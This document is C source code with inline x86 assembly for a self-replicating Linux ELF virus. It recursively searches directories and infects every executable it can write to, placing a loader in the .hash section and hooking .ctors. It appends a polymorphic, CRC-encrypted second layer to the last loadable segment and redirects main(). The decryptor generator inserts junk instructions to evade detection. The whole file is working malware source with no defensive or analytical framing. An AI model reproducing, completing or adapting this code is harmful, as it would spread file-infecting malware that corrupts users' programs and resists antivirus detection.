asm(".byte 0xF6,0xAA,0xB0,0xD0,0x0B,0x45,0xD4,0xE9,0x49,0xFF,0xFF,0xFF,0x0C,0x84,0xAA,0xB0");
asm(".byte 0xC0,0x0B,0x45,0xB4,0x0B,0x45,0xB0,0xAA,0xC3,0x0C,0xF6,0xAA,0xB0,0xC0,0x0B,0x45");
asm(".byte 0xB8,0xAA,0xE9,0xDB,0x00,0x00,0x00,0xB0,0x0F,0xAA,0xB0,0xAF,0xAA,0xB0,0xC0,0x0B");
asm(".byte 0x45,0xC4,0x0B,0x45,0xC0,0xAA,0xC3,0xB0,0x69,0xAA,0xE8,0xEE,0xFF,0xFF,0xFF,0xE9");
asm(".byte 0xC4,0x00,0x00,0x00,0x0C,0xD0,0x0B,0x45,0xD8,0xAA,0xB0,0xC0,0x0B,0x45,0xCC,0x0B");
asm(".byte 0x45,0xF0,0xAA,0xC3,0x0C,0xC0,0xAA,0xB0,0xC0,0x0B,0x45,0xCC,0x0B,0x45,0xF0,0xAA");
asm(".byte 0xE9,0xAD,0x00,0x00,0x00,0xB0,0x0F,0xAA,0xB0,0xA4,0x0B,0x45,0xD4,0xAA,0xB0,0xC0");
asm(".byte 0xE8,0x05,0x00,0x00,0x00,0xE9,0x98,0x00,0x00,0x00,0xB0,0xC0,0x0B,0x45,0xBC,0x0B");
asm(".byte 0x45,0xC8,0xAA,0xC3,0xF7,0x45,0x10,0x02,0x00,0x00,0x00,0x0F,0x84,0x78,0xFD,0xFF");
asm(".byte 0xFF,0xB0,0x0F,0xAA,0xB0,0xA5,0x0B,0x45,0xD4,0xAA,0xEB,0xDE,0xB0,0x0F,0xAA,0xB0");
asm(".byte 0xC8,0xEB,0xDC,0xB0,0x0F,0xAA,0xB0,0xC0,0x0B,0x45,0xFC,0xAA,0xE9,0xE1,0xFE,0xFF");
asm(".byte 0xFF,0xB0,0x0F,0xAA,0xB0,0xBC,0x0B,0x45,0xDC,0xAA,0xE9,0x6E,0xFF,0xFF,0xFF,0xB0");
asm(".byte 0x0F,0xAA,0xB0,0xBA,0xAA,0xB0,0xE0,0x0B,0x45,0xD0,0x0B,0x45,0xC8,0xAA,0xEB,0x42");
asm(".byte 0xB0,0x0F,0xAA,0xB0,0xA3,0x0B,0x45,0xD0,0xAA,0xEB,0x9F,0x66,0xB8,0xEB,0x01,0x66");
asm(".byte 0xAB,0xB8,0x00,0x01,0x00,0x00,0xE8,0x33,0x00,0x00,0x00,0xAA,0xC3,0xB0,0x26,0x0B");
asm(".byte 0x45,0xD0,0xAA,0xC3,0xB0,0x64,0x0B,0x45,0xDC,0xAA,0xC3,0xB0,0xF2,0x0B,0x45,0xDC");
asm(".byte 0xAA,0xC3,0x83,0x7D,0xFC,0x00,0x74,0x0A,0xE8,0x00,0x00,0x00,0x00,0xE8,0x00,0x00");
asm(".byte 0x00,0x00,0xB8,0x00,0x01,0x00,0x00,0xE8,0x02,0x00,0x00,0x00,0xAA,0xC3,0x60,0x50");
asm(".byte 0xFF,0x75,0x08,0xFF,0x55,0x28,0x83,0xC4,0x08,0x89,0x44,0x24,0x1C,0x61,0x0B,0xC0");
asm(".byte 0xC3,0xB8,0x08,0x00,0x00,0x00,0xE8,0xE3,0xFF,0xFF,0xFF,0xC3,0x8B,0x55,0x10,0xEB");
asm(".byte 0x0D,0x8B,0x55,0x14,0xEB,0x08,0x8B,0x55,0x10,0x0B,0x55,0x14,0xEB,0x00,0xE8,0xDE");
asm(".byte 0xFF,0xFF,0xFF,0x8B,0xC8,0x83,0x7D,0xFC,0x00,0x75,0x03,0x83,0xE1,0x03,0x0F,0xA3");
asm(".byte 0xCA,0x73,0xEB,0xC3");

static uint32_t random(globals *gl, uint32_t range)
{
	return (gl->seed = gl->seed * 214013 + 2531011) % range;
}

static int alloc_reg(uint8_t *mask) {
	int i;
	for (i = random(g, 8) ; ; i = (i + 1) & 7)
		if (*mask & (1 << i)) {
			*mask &= ~(1 << i);
			return i;
		}
}

static void free_reg(int reg, uint8_t *mask) {
	*mask |= (1 << reg);
}

static uint8_t *trash(globals *gl, uint8_t *ptr, uint32_t regfree) {
	int s;
	etg(gl, ETG_ALL-ETG_SEG-ETG_REP,
		REG_ALL, regfree, &s, 8, 128, ptr, gl->random);
	return ptr + s;
}

static int make_decryptor(uint8_t *buf, uint8_t *src, uint32_t src_va, uint32_t src_sz)
{
#define	emit1(x)	*buf++ = x
#define emit2(x,y)	do { *buf++ = x; *buf++ = y; } while(0)
#define	emit4(x)	do { *(uint32_t*)buf = x; buf += 4; } while(0)
	uint8_t free_regs = 0xcf, *label, *orig_buf, saved_regs[8], *sz;
	uint32_t crc_reg, dst_reg, push_count;

	void codegen(uint32_t cmdargs, uint32_t cmdtype, uint32_t dst, uint32_t src) {
		int s = 0;
		cg(g, buf, &s, free_regs, NULL,
			cmdtype == cmd_cmp ? NULL : (void*)g->trash, g->random,
			cmdargs, cmdtype, dst, src);
		buf += s;
	}

	orig_buf = buf;
	uint32_t key = random(g, -1);
	/* encrypt body */
	int i, j;
	uint32_t x, crc = key;
	for (i = 0; i < src_sz; i++) {
		for (j = 0; j < 256; j++) {
			x = crc32c_intel(crc, j);
			if ((x >> 24) == src[i]) {
				*buf++ = j;
				crc = x;
				break;
			}
		}
	}
	sz = buf;
	emit4(0);
#ifdef	DEBUG
	emit4(0x90909090);
	emit4(0x90909090);
#endif
	/* save regs */
	push_count = 0;
	if (random(g, 8) == 7) {
		emit1(0x60);
		push_count--;
	} else {
		uint8_t reg, mask = ~(REG_ESP | REG_EAX | REG_ECX);
		while (mask != 0) {
			reg = alloc_reg(&mask);
			emit1(0x50 | reg);
			saved_regs[push_count++] = reg;
		}
	}
	
	/* init vars */
	crc_reg = alloc_reg(&free_regs); codegen(cmd_r_c, cmd_mov, crc_reg, key);	/* initial crc value */
	dst_reg = alloc_reg(&free_regs); codegen(cmd_r_c, cmd_mov, dst_reg, src_va);	/* encrypted body start */

	/* loop label */
	label = buf;	
	
	/* crc32b crc_reg, [dst_reg] */
	emit4(0xf0380ff2);
	emit1((crc_reg << 3) | dst_reg);

	/* (byte) [dst_reg] <- MSB(crc_reg) */
	uint32_t t0;
	for (;;) {
		t0 = alloc_reg(&free_regs);
		if (t0 < 3)
			break;
		free_reg(t0, &free_regs);
	}
	codegen(cmd_r_r, cmd_mov, t0, crc_reg);
	emit2(0xc1, 0xe8 | t0);	emit1(0x18);	/* shr t0, 24 */
	emit2(0x88, (t0 << 3) | dst_reg);	/* mov byte [dst_reg], t0 */
	free_reg(t0, &free_regs);

	codegen(cmd_r_c, cmd_add, dst_reg, 1);
	codegen(cmd_r_c, cmd_cmp, dst_reg, src_va + src_sz);

	/* JB loop */
	emit2(0x0f, 0x82);
	emit4(-(buf - label + 4));
	
	/* restore regs */
	if (push_count == -1)
		emit1(0x61);
	else
	while (push_count > 0)
		emit1(0x58 | saved_regs[--push_count]);

	/* jmp virus start */
	int length = buf - orig_buf + 5;
	emit1(0xe9);
	emit4(-length);

	*(uint32_t*)sz = length;
	return length;
}

static int check_elf_header(Elf32_Ehdr *ehdr)
{
	if (ehdr->e_type != ET_EXEC || ehdr->e_machine != EM_386 ||
		ehdr->e_version != EV_CURRENT ||
		(ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE &&
		 ehdr->e_ident[EI_OSABI] != ELFOSABI_TARGET))
		return 1;
	/* already infected? */
	if (*((char*)ehdr + 15))
		return 1;
	return 0;
}

static Elf32_Shdr *find_ctors(Elf32_Ehdr *ehdr, Elf32_Shdr *shdr)
{
	int i;
	char ctors[8];
	*(uint32_t*)(ctors + 0) = 0x6f74632e;
	*(uint32_t*)(ctors + 4) = 0x00007372;	
	if (ehdr->e_shstrndx == SHN_UNDEF)
		return NULL;
	char *strtab = (char*)ehdr + shdr[ehdr->e_shstrndx].sh_offset;
        for (i = 1; i < ehdr->e_shnum; i++)
		if (! strcmp(strtab + shdr[i].sh_name, ctors))
			return &shdr[i];
	return NULL;

}

static Elf32_Phdr *find_last_PT_LOAD(Elf32_Ehdr *ehdr)
{
	Elf32_Phdr *phdr, *ph;
	int i;
	phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);
	ph = NULL;
	for (i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_LOAD && (ph == NULL || phdr[i].p_vaddr > ph->p_vaddr))
			ph = &phdr[i];
	return ph;
}

static uint32_t *find_pmain(Elf32_Ehdr *ehdr, Elf32_Shdr *shdr)
{
	int i, j;
        for (i = 1; i < ehdr->e_shnum; i++)
		if (ehdr->e_entry >= shdr[i].sh_addr && ehdr->e_entry < shdr[i].sh_addr + shdr[i].sh_size) {
			uint8_t *p = (char*)ehdr + shdr[i].sh_offset;
			/* FIXME! This is ugly! */
			for (j = 0; j < 64; j++)
				if (p[j] == 0x68 && p[j + 5] == 0xe8)
					return (uint32_t*)(p + j + 1);
		}
	return NULL;
}

static void infect(char *filename)
{
	int h, l, i;
	char *m;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *ph;
	Elf32_Shdr *shdr, *sh;
	uint32_t *layer1_entry = NULL, *layer2_entry = NULL;
	uint32_t layer2_offs, layer2_addr;	
	int tl, dl;
	Elf32_Sym *sym;
	char *str;	
	uint8_t *buf, *src;

	/* open victim, check size, mmap... */	
	if ((h = open(filename, 2)) < 0)
		return;
	if ((l = lseek(h, 0, 2)) < MIN_VICTIM_SIZE || l > MAX_VICTIM_SIZE)
		goto _close;
	m = (void*)mmap(0x1000, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
	if (m > (char*)0xfffff000)
		goto _close;
	/* check ELF header */
	ehdr = (Elf32_Ehdr*)m;
	if (check_elf_header(ehdr))
		goto _unmap;	
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);

/* WRITE LAYER 1 */
	if ((sh = find_ctors(ehdr, shdr)) == NULL)
		goto _unmap;
	layer1_entry = (uint32_t*)(m + sh->sh_offset - 4);
	for (sh = NULL, i = 0; i < ehdr->e_shnum; i++)
		if (shdr[i].sh_type == SHT_HASH)
			sh = &shdr[i];
	if (sh == NULL)
		goto _unmap;
	/* find symbol table and strings */
	i = sh->sh_link;
	sym = (Elf32_Sym*)(m + shdr[i].sh_offset);
	i = shdr[i].sh_link;
	str = (char*)(m + shdr[i].sh_offset);
	/* rebuild hash */
	uint32_t *hash = (uint32_t*)(m + sh->sh_offset), nb = hash[0], nc = hash[1];
	if (((int)(nb - (g->layer1_size + 3) / 4)) < 1)
		goto _unmap;
	bzero(m + sh->sh_offset, (nb + nc + 2) * 4);
	nb -= (g->layer1_size + 3) / 4;
	build_hash(hash, nb, nc, sym, str);
	/* write layer 1 */
	i = (2 + nb + nc) * 4;
	memcpy(m + sh->sh_offset + i, (void*)g->layer1_addr, g->layer1_size);
	/* update .ctors */
	layer1_entry[0] = 0xffffffff;
	layer1_entry[1] = sh->sh_addr + i;

/* WRITE LAYER 2 */
	if ((ph = find_last_PT_LOAD(ehdr)) == NULL)
		goto _unmap;
	layer2_offs = ph->p_offset + ph->p_filesz;
	layer2_addr = ph->p_vaddr + ph->p_filesz;
	if ((layer2_entry = find_pmain(ehdr, shdr)) == NULL)
		goto _unmap;
	tl = g->layer2_size + 4;
	buf = sbrk(tl + 4096);
	src = sbrk(tl);
	memcpy(src, (void*)g->layer2_addr, g->layer2_size);
	*(uint32_t*)(src + 6) = *layer2_entry; /* save old main() address */
	*(uint32_t*)(src + g->layer2_size) = layer1_entry[1]; /* save new layer1 address */
	dl = make_decryptor(buf, src, layer2_addr, tl);
	MAKE_HOLE(layer2_offs, dl);
	memcpy(m + layer2_offs, buf, dl);
	ph->p_filesz += dl;
	if (ph->p_memsz < ph->p_filesz)
		ph->p_memsz = ph->p_filesz;
	ph->p_flags |= PF_X | PF_R;
	ph->p_align = 0x1000;
	SHIFT_SHDRS(layer2_offs, dl);
	*layer2_entry = layer2_addr + tl + 4;	/* +4 for length, see make_decryptor */
	brk(g->savebrk);
	g->lastbrk = g->savebrk;

	m[15]++;
_unmap:	munmap(m, l);
_close:	close(h);
}

static void search(char *dir_name)
{
	struct stat sbuf;
	struct dirent d;
	int h;
	char ddot[3] = { '.', '.', '\0' };

	if (dir_name == NULL)
		dir_name = ddot + 1;
	if ((h = open(dir_name, 0)) < 0)
		return;
	while (readdir(h, &d)) {
		if (d.d_name[0] == '.')
			if (d.d_name[1] == '\0' || *(uint16_t*)(d.d_name + 1) == 0x2e)
				continue;
		lstat(d.d_name, &sbuf);
		if (S_ISLNK(sbuf.st_mode))
			continue;
		if (chdir(d.d_name) == 0) {
			search(ddot + 1);
			chdir(ddot);
		} else {
			if (access(d.d_name, X_OK) == 0)
				infect(d.d_name);
		}
	}
	close(h);
}

extern void layer1(void);
extern void layer1_e(void);
void virus(int esp)
{
	globals glob;
	g = &glob;

	/* setup data */
	g->layer2_addr = (uint32_t)__builtin_return_address(0) - 5;
	g->layer2_size = (uint32_t)&virus_end - (uint32_t)&virus_start;
	g->layer1_addr = *(uint32_t*)(g->layer2_addr + g->layer2_size);
	g->layer1_size = (uint32_t)&layer1_e - (uint32_t)&layer1;
	g->random = g->layer2_addr + (uint32_t)&random - (uint32_t)&virus_start;
	g->trash = g->layer2_addr + (uint32_t)&trash - (uint32_t)&virus_start;
	g->seed = time(0) ^ getpid();
	g->lastbrk = NULL;
	search(NULL);
	uint32_t sz = *(uint32_t*)(g->layer2_addr + g->layer2_size + 4);
#ifdef	DEBUG	
	putx4(g->layer1_size);
	putc(' ');
	putx4(g->layer2_size);
	putc(' ');
	putx4(sz);
	putc(10);
#endif
	/* move itself to the new memory location */
	uint32_t nloc;
	nloc = mmap(NULL, g->layer2_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	memcpy((void*)nloc, (void*)g->layer2_addr, g->layer2_size);
	mprotect(nloc, g->layer2_size, PROT_READ|PROT_EXEC);
	asm volatile ("leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:":: "r"(nloc):"%eax");
	/* clean .bss area */
	bzero((void*)g->layer2_addr, sz);
	/* adjust return address */
	*(uint32_t*)(&esp - 1) = (nloc + 5);
}
asm("virus_end:");
asm(".long layer1");	/* address of layer 1 */
asm(".long 0");		/* size of virus + decryptor */
asm(".globl main; main: jmp virus_start");
